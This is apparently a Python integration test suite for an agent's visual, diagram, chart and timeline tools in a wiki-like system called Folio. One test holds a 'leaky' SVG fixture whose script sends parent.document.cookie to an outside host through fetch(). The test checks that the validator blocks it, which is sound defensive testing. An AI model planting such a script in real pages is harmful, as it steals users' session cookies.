"""Folio's visual tools (Folio 3.3 and 3.4): an agent adds a visual, a diagram, a chart and
a timeline to a draft, and learns what the sandbox would block before it does."""

from httpx import AsyncClient
from mcp import Client

from radicle.folio.mcp.visuals import INTERACTIVE, STARTER
from tests.conftest import Team
from tests.integration.folio_helpers import API, METADATA, agent_can_write
from tests.mcp.conftest import error_text, folio_mcp, payload

DRAFT = "Intro.\n\n# Flujo\n\nCómo fluye.\n\n# Cifras\n\nLos números.\n"


async def _page(client: AsyncClient, team: Team, folio: Client) -> str:
    args = {"space": "eng", "title": "Métricas", "content_md": DRAFT, "metadata": METADATA}
    return str(payload(await folio.call_tool("create_page", args))["id"])


async def _space(client: AsyncClient, team: Team) -> None:
    i = team.instance.headers
    await client.post(f"{API}/spaces", headers=i, json={"key": "eng", "name": "Ingeniería"})
    await agent_can_write(client, team, "eng")


async def test_an_agent_adds_visual_blocks(client: AsyncClient, team: Team) -> None:
    await _space(client, team)
    async with folio_mcp(client, team.agent) as folio:
        page = await _page(client, team, folio)
        guide = (await folio.read_resource("folio://guide/visuals")).contents[0].text
        assert "--rdc-accent" in guide and "default-src 'none'" in guide
        checked = payload(
            await folio.call_tool("validate_visual", {"format": "svg", "code": STARTER})
        )
        assert not checked["valid"] and "description is required" in checked["problems"][0]
        args = {
            "id": page,
            "format": "svg",
            "code": STARTER,
            "title": "Etapas",
            "description": "Las tres etapas de una página: borrador, revisión y publicada.",
            "after_heading": "flujo",
        }
        out = payload(await folio.call_tool("insert_visual", args))
        md = out["content_md"]
        assert md.index("# Flujo") < md.index("```visual") < md.index("# Cifras")
        args = {"id": page, "source": "flowchart LR; A-->B", "caption": "Flujo"}
        md = payload(await folio.call_tool("insert_diagram", args | {"after_heading": "Flujo"}))[
            "content_md"
        ]
        assert md.index("```visual") < md.index("```mermaid") < md.index("# Cifras")
        data = [["Mes", "Abiertos", "Cerrados"], ["Ene", 4, 9], ["Feb", 2, 1.5]]
        args = {"id": page, "kind": "bar", "data": data, "title": "Tickets"}
        md = payload(await folio.call_tool("insert_chart", args))["content_md"]
        assert md.rstrip().endswith("```") and "| Feb | 2 | 1.5 |" in md
        items = [{"date": "2026-01", "title": "Beta"}, {"title": "Lanzamiento", "text": "GA"}]
        md = payload(await folio.call_tool("insert_timeline", {"id": page, "items": items}))[
            "content_md"
        ]
        assert "2026-01 | Beta" in md
        # It goes out like any agent's page: waiting for a Folio admin's approval.
        args = {"id": page, "change_note": "Con visuales"}
        assert payload(await folio.call_tool("submit_for_publication", args))["status"] == "pending"
    r = await client.get(f"{API}/nodes/{page}/draft", headers=team.instance.headers)
    types = [b["type"] for b in r.json()["content_json"]["content"]]
    assert types.count("visual") == types.count("diagram") == 1
    assert types[-2:] == ["chart", "timeline"]


async def test_errors_say_what_to_fix(client: AsyncClient, team: Team) -> None:
    await _space(client, team)
    leaky = '<svg><script>fetch("https://x.io/a?c="+parent.document.cookie)</script></svg>'
    async with folio_mcp(client, team.agent) as folio:
        page = await _page(client, team, folio)
        checked = payload(
            await folio.call_tool(
                "validate_visual",
                {"format": "html", "code": leaky, "title": "x", "description": "Robo"},
            )
        )
        assert not checked["valid"]
        assert any("fetch()" in p for p in checked["problems"])
        assert any("parent" in p for p in checked["problems"])
        args = {
            "id": page,
            "format": "html",
            "code": leaky,
            "title": "x",
            "description": "Un gráfico",
        }
        text = error_text(await folio.call_tool("insert_visual", args))
        assert "fetch() needs the network" in text
        args = {"id": page, "source": "graph TD", "after_heading": "Nada"}
        text = error_text(await folio.call_tool("insert_diagram", args))
        assert "There is no heading 'Nada'" in text and "Flujo, Cifras" in text
        bad = [["Mes", "Abiertos"], ["Ene", "cuatro"]]
        text = error_text(
            await folio.call_tool("insert_chart", {"id": page, "kind": "bar", "data": bad})
        )
        assert "must be a number" in text
        text = error_text(await folio.call_tool("insert_timeline", {"id": page, "items": []}))
        assert "1 to 100 items" in text


async def test_an_agent_organizes_and_edits_visuals(client: AsyncClient, team: Team) -> None:
    i = team.instance.headers
    r = await client.post(
        f"{API}/admin/grants",
        headers=i,
        json={"grantee_type": "user", "grantee": team.agent.handle, "role": "creator"},
    )
    assert r.status_code == 201, r.text
    async with folio_mcp(client, team.agent) as folio:
        space = payload(
            await folio.call_tool("create_space", {"key": "mna", "name": "MNA", "icon": "🎓"})
        )
        assert space["key"] == "mna" and "create" in space["permissions"]
        text = error_text(await folio.call_tool("create_space", {"key": "M N", "name": "x"}))
        assert "key" in text
        folder = payload(
            await folio.call_tool("create_folder", {"space": "mna", "title": "Visión"})
        )
        args = {
            "space": "mna",
            "title": "Harris",
            "content_md": DRAFT,
            "metadata": METADATA,
            "parent": folder["id"],
        }
        page = str(payload(await folio.call_tool("create_page", args))["id"])
        guide = (await folio.read_resource("folio://guide/visuals")).contents[0].text
        assert "Interactive visuals" in guide and INTERACTIVE in guide
        args = {
            "id": page,
            "format": "html",
            "code": INTERACTIVE,
            "title": "Puntos",
            "description": "Botones y un deslizador que redibujan los puntos.",
        }
        await folio.call_tool("insert_visual", args)
        listed = payload(await folio.call_tool("list_visuals", {"id": page}))
        assert listed[0]["title"] == "Puntos" and listed[0]["format"] == "html"
        got = payload(await folio.call_tool("get_visual", {"id": page, "index": 0}))
        assert got["code"] == INTERACTIVE
        out = payload(
            await folio.call_tool("update_visual", {"id": page, "index": 0, "title": "Más"})
        )
        assert out["visuals"][0]["title"] == "Más"
        text = error_text(await folio.call_tool("get_visual", {"id": page, "index": 4}))
        assert "the draft has 1 visual(s)" in text
        out = payload(await folio.call_tool("remove_visual", {"id": page, "index": 0}))
        assert out["visuals"] == [] and "```visual" not in out["content_md"]
    r = await client.get(f"{API}/spaces/mna/tree", headers=i)
    assert r.json()[0]["title"] == "Visión" and r.json()[0]["children"][0]["title"] == "Harris"
